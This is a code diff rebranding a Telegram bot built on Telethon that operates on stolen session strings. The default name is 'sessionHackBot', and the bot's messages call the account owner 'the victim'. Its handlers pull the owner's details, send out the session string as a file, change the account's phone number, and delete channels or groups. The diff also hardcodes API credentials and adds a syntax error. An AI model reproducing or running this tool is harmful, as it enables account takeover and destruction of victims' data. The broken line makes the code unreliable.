@@ -1,6 +1,6 @@
 
 from WWWL5 import bot, WWWL5
-#By Source aljoker @EE_20
+#By Source aljoker vzo_a
 from telethon import events, functions, types, Button
 from datetime import timedelta
 import asyncio
@@ -19,7 +19,7 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 
 bot = borg = tgbot
 
-Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
+Bot_Username = Config.TG_BOT_USERNAME or"Fox578_BOT"
 
 async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -187,7 +187,7 @@ menu = '''
 
 '''
 mm = '''
-قم بلأنضمام الى قناة سبايدر @EE_20
+قم بلأنضمام الى قناة 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐎𝐗&𝐍𝐎𝐑 𓅃vzo_a
 '''
 
 keyboard = [
@@ -212,7 +212,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("سورس سبايدر 🕷", "https://t.me/EE_20")
+    Button.url("سورس 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐎𝐗&𝐍𝐎𝐑 𓅃🕷", "https://t.me/EE_20")
     ]
 ]
 
@@ -257,7 +257,7 @@ async def start(event):
             Button.url("المطور", "https://t.me/WWWL5")
             ]
         ]
-        await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
+        await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}"8, buttons=keyboard)
     
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
 async def users(event):
@@ -275,12 +275,12 @@ async def users(event):
         return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @EE_20")
+        file.write(i + "\n\nDetails BY vzo_a")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nشكراً لأستخدامك سورس سبايدر ❤️. \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\nشكراً لأستخدامك سورس 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐎𝐗&𝐍𝐎𝐑 𓅃❤️. \n/hack", buttons=keyboard)
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
@@ -293,7 +293,7 @@ async def users(event):
     else:
       return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nشكراً لأستخدامك سورس سبايدر ❤️.\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\nشكراً لأستخدامك سورس 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐎𝐗&𝐍𝐎𝐑 𓅃❤️.\n/hack", buttons=keyboard)
     
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
@@ -367,7 +367,7 @@ async def users(event):
       await x.send_message("اعطيني معرف/ايدي القناة او الكروب")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك سبايدر.", buttons=keyboard)
+      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك fox.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
